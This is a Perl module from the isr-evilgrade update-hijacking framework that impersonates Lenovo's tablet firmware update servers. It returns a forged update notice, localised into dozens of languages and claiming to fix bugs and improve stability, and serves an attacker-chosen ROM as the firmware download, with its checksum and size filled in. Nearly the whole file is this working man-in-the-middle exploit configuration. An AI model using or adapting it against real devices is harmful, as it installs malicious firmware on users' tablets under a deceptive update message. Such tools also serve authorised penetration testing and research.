###############
# lenovofirmware.pm
#
# Copyright 2016 Matias Ariel Re Medina
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::lenovofirmware;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'lenovofirmware',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{Lenovo's firmware update},
    'vh'          => 'fus.lenovomm.com|tabdl.ota.lenovomm.com',
    'request'     => [
        {   'req'  => 'firmware/.*/updateservlet',  #regex friendly
            'type' => 'string',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '0',
            'string' =>
                '<?xml version="1.0" encoding="UTF-8"?><firmwareupdate xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="firmware.xsd"><firmware>     <num>1</num>        <name>YT2-830L_USR_S<%RND3%>_<%RND1%>_WW21_ROW_TO_YT2-830L_USR_S<%RND4%>_<%RND2%>_WW21_ROW</name>       <object_to_name>YT2-830L_USR_S<%RND4%>_<%RND2%>_WW21_ROW</object_to_name>       <desc_zh_CN><![CDATA[警告：
                1. 本次更新不会清除数据, 但重要数据请做好备份, 以免升级失败造成数据丢失!
                2. 为避免更新失败，请在固件下载过程中停留在当前界面，并保持网络稳定,设备电源充足。
                本次固件升级将进行漏洞修复, 并增强设备稳定性。]]></desc_zh_CN>        <desc_en_US><![CDATA[Warning:
                1. This update will not erase data. However, please backup important data to avoid data loss due to update failure!
                2. To avoid update failure, please stay on the current interface during firmware download, maintain the network connection, and ensure sufficient battery life.
                This firmware upgrade will fix bugs and increase device stability.]]></desc_en_US>      <desc_cn><![CDATA[警告：
                1. 本次更新不会清除数据, 但重要数据请做好备份, 以免升级失败造成数据丢失!
                2. 为避免更新失败，请在固件下载过程中停留在当前界面，并保持网络稳定,设备电源充足。
                本次固件升级将进行漏洞修复, 并增强设备稳定性。]]></desc_cn>       <desc_tw><![CDATA[警告：
                1.此更新不會消除資料。不過，請備份重要資料，以避免因更新失敗造成資料遺失！
                2.為了避免更新失敗，請在韌體下載期間停留在目前的介面、保持網路連線，並確定有充足的電池壽命。
                此韌體升級將修正錯誤並增加裝置穩定性。]]></desc_tw>        <desc_en><![CDATA[Warning:
                1. This update will not erase data. However, please backup important data to avoid data loss due to update failure!
                2. To avoid update failure, please stay on the current interface during firmware download, maintain the network connection, and ensure sufficient battery life.
                This firmware upgrade will fix bugs and increase device stability.]]></desc_en>     <desc_al><![CDATA[Warning:
                1. This update will not erase data. However, please backup important data to avoid data loss due to update failure!
                2. To avoid update failure, please stay on the current interface during firmware download, maintain the network connection, and ensure sufficient battery life.
                This firmware upgrade will fix bugs and increase device stability.]]></desc_al>     <desc_ar><![CDATA[تحذير:
                1. لن يعمل هذا التحديث على مسح البيانات. ولكن الرجاء عمل نسخة احتياطية من البيانات المهمة لتجنب فقد البيانات نتيجة فشل التحديث!
                2. لتجنب فشل التحديث، الرجاء البقاء في الواجهة الحالية أثناء تنزيل البرنامج الثابت، والاحتفاظ باتصال الشبكة، والتأكد من وجود عمر كافٍ للبطارية.
                ستعمل ترقية البرنامج الثابت هذه على إصلاح المشاكل وزيادة استقرار الجهاز.]]></desc_ar>       <desc_bg><![CDATA[Предупреждение:
                1. Тази актуализация няма да изтрие данни. Независимо от това архивирайте важните данни, за да не ги изгубите, ако актуализацията е неуспешна!
                2. За да избегнете неуспешната актуализация, останете с настоящия интерфейс, докато тече изтеглянето на фърмуера, поддържайте връзката с мрежата и осигурете достатъчно живот на батерията.
                Тази надстройка на фърмуера ще поправи различни грешки и ще подобри стабилността на устройството.]]></desc_bg>      <desc_cs><![CDATA[Varování:
                1. Během této aktualizace nebudou vymazána žádná data. Přesto doporučujeme, abyste si všechna důležitá data zálohovali. Předejdete tak jejich ztrátě v případě, že by se aktualizace nezdařila.
                2. Chcete-li předejít selhání aktualizace, neopouštějte prosím v průběhu stahování firmwaru toto rozhraní, přesvědčte se, že jste připojení k síti a máte dostatečně nabitou baterii.
                Tato aktualizace firmwaru opraví chyby a zvýší stabilitu zařízení.]]></desc_cs>     <desc_da><![CDATA[Advarsel:
                1. Denne opdatering vil ikke slette data. Men sikkerhedskopier alligevel vigtige data for at undgå datatab på grund af opdateringsfejl!
                2. For at undgå opdateringsfejl skal du blive på den nuværende grænseflade under overførslen af firmware, opretholde netværksforbindelsen og sørge for, at der er tilstrækkelig strøm på batteriet.
                Denne firmwareopgradering retter fejl og øger enhedens stabilitet.]]></desc_da>     <desc_de><![CDATA[Warnung:
                1. Bei dieser Aktualisierung werden keine Daten gelöscht. Achten Sie jedoch darauf, wichtige Daten zu sichern, um Datenverlust aufgrund fehlgeschlagener Aktualisierung zu vermeiden!
                2. Um ein Fehlschlagen der Aktualisierung zu vermeiden, bleiben Sie bitte während des Firmware-Downloads auf der aktuellen Benutzeroberfläche, halten Sie die Internetverbindung aufrecht und stellen Sie sicher, dass Ihr Akku ausreichend geladen ist.
                Diese Firmware-Aktualisierung behebt Fehler und erhöht die Stabilität Ihres Geräts.]]></desc_de>        <desc_el><![CDATA[Προειδοποίηση:
                1. Αυτή η ενημέρωση δεν θα διαγράψει δεδομένα. Ωστόσο, δημιουργήστε εφεδρικά αντίγραφα των σημαντικών δεδομένων, για να αποφύγετε την απώλεια δεδομένων λόγω αποτυχίας της ενημέρωσης!
                2. Για να αποτρέψετε την αποτυχία της ενημέρωσης, παραμείνετε στην τρέχουσα επιφάνεια εργασίας κατά τη λήψη του υλικολογισμικού, διατηρήστε τη σύνδεση με το δίκτυο και βεβαιωθείτε ότι η ισχύς της μπαταρίας είναι επαρκής.
                Αυτή η ενημέρωση υλικολογισμικού θα επιδιορθώσει σφάλματα και θα αυξήσει τη σταθερότητα της συσκευής.]]></desc_el>      <desc_es><![CDATA[Advertencia:
                1. Esta actualización no eliminará los datos. Sin embargo, cree una copia de seguridad de los datos importantes para evitar la pérdida de estos últimos debido una anomalía de actualización.
                2. Para evitar una anomalía de actualización, permanezca en la interfaz actual durante la descarga de firmware, mantenga la conexión de red y asegúrese de tener batería suficiente.
                Esta actualización de firmware reparará errores y aumentará la estabilidad del dispositivo.]]></desc_es>        <desc_fi><![CDATA[Varoitus:
                1. Tämä päivitys ei poista mitään tietoja. Tee kuitenkin varmuuskopio tärkeistä tiedoista, jotta tietoja ei katoaisi, jos päivityksen aikana ilmenee häiriö.
                2. Voit välttää päivitysongelmia seuraavasti: Älä poistu tästä käyttöliittymästä laiteohjelman latauksen aikana ja varmista, että verkkoyhteys on käytettävissä ja että akussa on riittävästi virtaa.
                Tämä laiteohjelmiston päivitys sisältää korjauksia aiempiin versioihin ja parantaa laitteen vakautta.]]></desc_fi>      <desc_fr><![CDATA[Attention :
                1. Cette mise à jour n\'entraînera pas de suppression de données. Veillez toutefois à sauvegarder vos données importantes pour éviter toute perte de données due à un échec de la mise à jour.
                2. Pour éviter l\'échec de la mise à jour, ne quittez pas l\'interface active pendant le téléchargement du microprogramme, n\'interrompez pas la connexion réseau et assurez-vous que la durée de vie de la batterie est suffisante.
                Cette mise à niveau du microprogramme permet de réparer les bogues et augmente la stabilité du périphérique.]]></desc_fr>       <desc_hi><![CDATA[चेतावनी:
                1. यह अपडेट डेटा को मिटाएगा नहीं. हालांकि, अपडेट विफलता के कारण डेटा का नुकसान होने से बचाने के लिए कृपया महत्वपूर्ण डेटा का बैकअप ले लें!
                2. अपडेट को विफल होने से बचाने के लिए, फ़र्मवेयर के डाउनलोड होने के दौरान कृपया वर्तमान इंटरफ़ेस पर बने रहें, नेटवर्क कनेक्शन कायम रखें और सुनिश्चित कर लें कि पर्याप्त बैटरी बची है.
                यह फ़र्मवेयर नवीनीकरण, बग्स को ठीक करेगा और डिवाइस की स्थिरता में वृद्धि करेगा.]]></desc_hi>        <desc_hr><![CDATA[Upozorenje:
                1. Ovo ažuriranje neće izbrisati podatke. No ipak sigurnosno kopirajte važne podatke da biste izbjegli gubitak podataka uslijed pogreške prilikom ažuriranja!
                2. Da biste izbjegli pogreške prilikom ažuriranja, ostanite na trenutnom sučelju tijekom preuzimanja firmvera, ne prekidajte mrežnu vezu i provjerite je li razina napunjenosti baterije zadovoljavajuća.
                Ovo ažuriranje firmvera popravit će programske pogreške i poboljšati stabilnost uređaja.]]></desc_hr>       <desc_hu><![CDATA[Figyelmeztetés!
                1. A frissítés nem töröl adatokat. Azonban frissítési hiba miatt elveszhetnek az adatai, ezért készítsen biztonsági másolatot a fontos adatokról.
                2. A frissítés sikertelenségének elkerülése érdekében maradjon ezen a felületen a belső vezérlőprogram letöltéséig, ne szakítsa meg a hálózati kapcsolatot, és biztosítsa a megfelelő tápellátást.
                A belső vezérlőprogram frissítése hibajavításokat tartalmaz és fokozza az eszköz stabilitását.]]></desc_hu>     <desc_it><![CDATA[Avvertenza:
                1. Questo aggiornamento non cancellerà i dati. Tuttavia, eseguire il backup di dati importanti per evitare la perdita di dati a causa di un errore di aggiornamento.
                2. Per evitare un eventuale errore di aggiornamento, restare nell\'interfaccia corrente durante il download del firmware, mantenere la connessione di rete e assicurarsi di disporre di una durata della batteria sufficiente.
                Questo aggiornamento del firmware risolverà eventuali bug e aumenterà la stabilità del dispositivo.]]></desc_it>        <desc_ja><![CDATA[警告:
                1.この更新によってデータが消去されることはありませんが、更新の失敗によるデータの損失を防ぐために、重要なデータをバックアップしてください!
                2.更新の失敗を防ぐために、ファームウェアのダウンロード中は使用中のインターフェースにとどまり、ネットワーク接続を維持し、バッテリー寿命が十分であることを確認してください。
                このファームウェア・アップグレードによってバグが修正され、デバイスの安定性が高まります。]]></desc_ja>       <desc_nb><![CDATA[Advarsel:
                1. Denne oppdateringen vil ikke slette data. Men sikkerhetskopier viktige data for å unngå datatap i tilfelle oppdateringsfeil!
                2. For å unngå oppdateringsfeil starter du på nåværende grensesnitt under fastvarenedlasting, opprettholder nettverksforbindelsen og sørger for tilstrekkelig batterinivå.
                Denne fastvareoppgraderingen korrigerer feil og øker enhetens stabilitet.]]></desc_nb>      <desc_nl><![CDATA[Waarschuwing:
                1. Er worden geen gegevens gewist. Maak van belangrijke gegevens een back-up maakt zodat u geen gegevens kwijt raakt bij een fout!
                2. Om een fout tijdens het updaten te voorkomen, blijft u gedurende het downloaden van de firmware op de huidige interface, behoud u de netwerkverbinding en zorgt u voor voldoende batterijduur.
                De firmware-upgrade lost bugs op en verhoogt de stabiliteit van het apparaat.]]></desc_nl>      <desc_pl><![CDATA[Ostrzeżenie:
                1. Ta aktualizacja nie spowoduje usunięcia danych. Należy jednak wykonać kopię zapasową ważnych danych, aby uniknąć ich utraty w przypadku niepowodzenia aktualizacji.
                2. Aby uniknąć niepowodzenia aktualizacji, należy korzystać z bieżącego interfejsu podczas pobierania oprogramowania wbudowanego, utrzymanie połączenia sieciowego i zapewnienie odpowiedniego poziomu naładowania akumulatora.
                Ta aktualizacja oprogramowania wbudowanego poprawia błędy i zwiększa stabilność pracy urządzenia.]]></desc_pl>      <desc_pt><![CDATA[Aviso:
                1. Esta actualização não apagará dados. Contudo, faça cópia de segurança dos dados importantes para evitar perder dados, se a actualização falhar!
                2. Para evitar a falha da actualização, mantenha-se na interface actual durante a transferência de firmware, mantenha a ligação de rede e assegure-se de que a bateria tem carga suficiente.
                Esta actualização de firmware corrigirá erros e aumentará a estabilidade do dispositivo.]]></desc_pt>       <desc_ro><![CDATA[Avertisment:
                1. Această actualizare nu va şterge datele. Totuşi, creaţi o copie de rezervă pentru datele importante pentru a evita pierderea acestora din cauza unei erori de actualizare!
                2. Pentru a evita o eroare de actualizare, rămâneţi în interfaţa curentă în timpul descărcării firmware-ului, menţineţi conexiunea la reţea şi asiguraţi-vă că aveţi suficientă baterie.
                Acest upgrade al firmware-ului va remedia erori şi va creşte stabilitatea dispozitivului.]]></desc_ro>      <desc_ru><![CDATA[Предупреждение.
                1. При этом обновлении данные не будут удалены. Тем не менее, рекомендуем создать резервную копию важных данных во избежание утери данных в случае сбоя обновления.
                2. Во избежание сбоя обновления оставайтесь в текущем интерфейсе в ходе загрузки микропрограммы, поддерживайте сетевое соединение и обеспечьте достаточный заряд аккумулятора.
                Это обновление микропрограммы содержит исправления ошибок и улучшает стабильность устройства.]]></desc_ru>      <desc_sk><![CDATA[Varovanie:
                1. Táto aktualizácia nevymaže údaje. Dôležité údaje si však zálohujte, aby ste ich nestratili v prípade zlyhania aktualizácie!
                2. Ak chcete zabrániť zlyhaniu aktualizácie, počas preberania firmvéru zostaňte v aktuálnom rozhraní, zachovajte funkčné sieťové pripojenie a zabezpečte dostatočnú výdrž batérie.
                Táto inovácia firmvéru opraví chyby a zvýši stabilitu zariadenia.]]></desc_sk>      <desc_sl><![CDATA[Opozorilo:
                1. Ta posodobitev ne bo izbrisala podatkov. Vseeno naredite varnostno kopijo pomembnih podatkov, da bi preprečili izgubo podatkov zaradi napake posodobitve!
                2. Da bi se izognili napakam pri posodobitvi, med prenosom vdelane programske opreme ostanite na trenutnem vmesniku, ohranite omrežno povezavo in zagotovite dovolj življenjske dobe akumulatorja.
                Ta nadgradnja vdelane programske opreme bo odpravila težave in povečala stabilnost naprave.]]></desc_sl>        <desc_sr><![CDATA[Upozorenje:
                1. Ovim ažuriranjem se neće obrisati podaci. Međutim, napravite rezervnu kopiju važnih podataka kako ne bi došlo do gubitka podataka zbog greške prilikom ažuriranja!
                2. Kako ne bi došlo do greške prilikom ažuriranja, ostanite na trenutnom interfejsu tokom preuzimanja firmvera, održavajte vezu sa mrežom i obezbedite dovoljno napunjenu bateriju.
                Nadogradnjom firmvera će se popraviti greške i povećati stabilnost uređaja.]]></desc_sr>        <desc_sv><![CDATA[Varning!
                1. Den här uppdateringen innebär inte att data raderas. Däremot bör du säkerhetskopiera viktig information så att ingenting går förlorat om uppdateringen skulle misslyckas.
                2. Du undviker problem med uppdateringen genom att behålla nätverksanslutningen och det aktuella gränssnittet när den nya programvaran hämtas, samt genom att se till att det finns tillräckligt mycket batteri kvar.
                Den här uppgraderingen åtgärdar fel och ökar enhetens stabilitet.]]></desc_sv>      <desc_tl><![CDATA[Babala:
                1. Hindi buburahin ng update na ito ang data. Gayunman, mangyaring i-backup ang mahalagang data para maiwasan ang pagkawala ng data sanhi sa hindi nagawang update!
                2. Para maiwasan na hindi magawa anag update, mangyaring manatili sa kasalukuyang interface sa oras ng download ng firmware, panatilihin ang koneksyon sa network, at tiyakin na sapat ang itatagal ng baterya.
                Aayusin ng update ng firmwar ang mga bug at daragdagan ang estabilidad ng aparato.]]></desc_tl>     <desc_tr><![CDATA[Uyarı:
                1. Bu güncelleme verilerinizi silmeyecek. Fakat data kaybını önlemek için verilerinizi yedeklemeniz önerilir.
                2. Oluşabilecek güncelleme hatalarını önlemek için lütfen arayüzü değiştirmeyin, yeterli şarjınız olduğundan ve ağ bağlantınız olduğundan emin olun.
                Bu güncelleme cihazdaki yazılım hatalarını düzeltmek içindir.]]></desc_tr>      <desc_uk><![CDATA[Увага!
                1. Під час оновлення дані не буде видалено. Однак створіть резервну копію важливих даних, щоб не втратити їх у разі помилки оновлення.
                2. Щоб уникнути помилки оновлення, під час завантаження прошивки залишайтеся в поточному інтерфейсі, підтримуйте з\'єднання з мережею та переконайтеся, що заряд акумулятора достатній.
                Під час цього оновлення прошивки буде виправлено помилки та покращено стабільність роботи пристрою.]]></desc_uk>        <desc_et><![CDATA[Hoiatus!
                1. See värskendus ei kustuta andmeid. Samas varundage olulised andmed, et vältida värskenduse nurjumisega põhjustatud andmekadu.
                2. Värskenduse nurjumise vältimiseks jääge püsivara allalaadimise ajaks praegusele liidesele, säilitage võrguühendus ja tagage piisav aku laetuse tase.
                See püsivaratäiendus parandab programmivead ja suurendab seadme stabiilsust.]]></desc_et>       <desc_iw><![CDATA[אזהרה:
                1. עדכון זה לא יגרום למחיקת נתונים. עם זאת, יש לגבות נתונים חשובים כדי להימנע מאובדן נתונים כתוצאה מכשל בעדכון!
                2. כדי להימנע מכשל בעדכון, אל תצאו מהממשק הנוכחי במהלך הורדת הקושחה, אל תנתקו את החיבור לרשת וודאו שהסוללה טעונה במידה מספקת.
                שדרוג הקושחה יתקן באגים וישפר את יציבות ההתקן.]]></desc_iw>     <desc_ko><![CDATA[경고:
                1. 이 업데이트는 데이터를 삭제하지 않습니다. 그러나 업데이트 장애로 인한 데이터 손실을 방지하려면 중요한 데이터는 백업하십시오!
                2. 업데이트 장애를 방지하려면 펌웨어를 다운로드하는 동안 현재 인터페이스를 계속 이용하면서 네트워크 연결을 유지하고 배터리 수명이 충분한지 확인하십시오.
                이 펌웨어로 업그레이드하면 버그가 수정되고 장치 안정성이 높아집니다.]]></desc_ko>     <desc_lt><![CDATA[Įspėjimas.
                1. Šis atnaujinimas nepašalins duomenų. Tačiau duomenis galite prarasti dėl nepavykusio atnaujinimo, todėl sukurkite atsarginę svarbių duomenų kopiją!
                2. Kad atnaujinimas būtų sėkmingas, programinės aparatinės įrangos atsiuntimo metu neišeikite iš sąsajos, nenutraukite tinklo ryšio ir pasirūpinkite pakankama akumuliatoriaus įkrova.
                Šis programinės aparatinės įrangos atnaujinimas ištaisys ankstesnes klaidas ir prietaisas veiks stabiliau.]]></desc_lt>     <desc_lv><![CDATA[Brīdinājums.
                1. Šis atjauninājums nedzēsīs datus. Tomēr, lūdzu, dublējiet svarīgos datus, lai izvairītos no datu zudumu atjauninājuma kļūmes dēļ!
                2. Lai izvairītos no atjauninājuma kļūmes, lūdzu, palieciet pašreizējajā interfeisā programmaparatūras lejupielādes laikā, saglabājiet tīkla savienojumu un nodrošiniet pietiekamu akumulatora darbības laiku.
                Šis programmaparatūras atjauninājums labos kļūdas un uzlabos ierīces stabilitāti.]]></desc_lv>      <desc_zh_HK><![CDATA[警告：
                1.此更新不會消除資料。不過，請備份重要資料，以避免因更新失敗造成資料遺失！
                2.為了避免更新失敗，請在韌體下載期間停留在目前的介面、保持網路連線，並確定有充足的電池壽命。
                此韌體升級將修正錯誤並增加裝置穩定性。]]></desc_zh_HK>     <desc_zh><![CDATA[警告：
                1.此更新不會消除資料。不過，請備份重要資料，以避免因更新失敗造成資料遺失！
                2.為了避免更新失敗，請在韌體下載期間停留在目前的介面、保持網路連線，並確定有充足的電池壽命。
                此韌體升級將修正錯誤並增加裝置穩定性。]]></desc_zh><tips><![CDATA[]]></tips>       <md5><%AGENTMD5%></md5>     <size><%AGENTSIZE%></size>      <releaseState>2</releaseState>      <level>3</level>        <needbackup>0</needbackup>      <downloadurl><![CDATA[http://tabdl.ota.lenovomm.com/dls/v6/YT2-830L_USR_S<%RND3%>_<%RND1%>_WW21_ROW_TO_YT2-830L_USR_S<%RND4%>_<%RND2%>_WW21_ROW_WC37.zip]]></downloadurl><result_msg></result_msg></firmware></firmwareupdate>
            ',
            'parse' => '1',
            'file'  => '',
        },
        {   'req'    => '.zip',     #regex friendly
            'type'   => 'agent',    #file|string|agent|install
            'method' => '',         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/rom_stub.zip',
            'desc' => 'Android ROM to update.'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'romname' => {
            'val' =>
                'YT2-830L_USR_S000067_1410301707_WW21_ROW_TO_YT2-830L_USR_S000209_1504220538_WW21_ROW_WC37',
            'desc' => 'ROM file name.'
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(10)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd2' => {
            'val'     => 'isrcore::utils::RndNum(10)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd3' => {
            'val'     => 'isrcore::utils::RndNum(6)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd4' => {
            'val'     => 'isrcore::utils::RndNum(6)',
            'hidden'  => 1,
            'dynamic' => 1
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
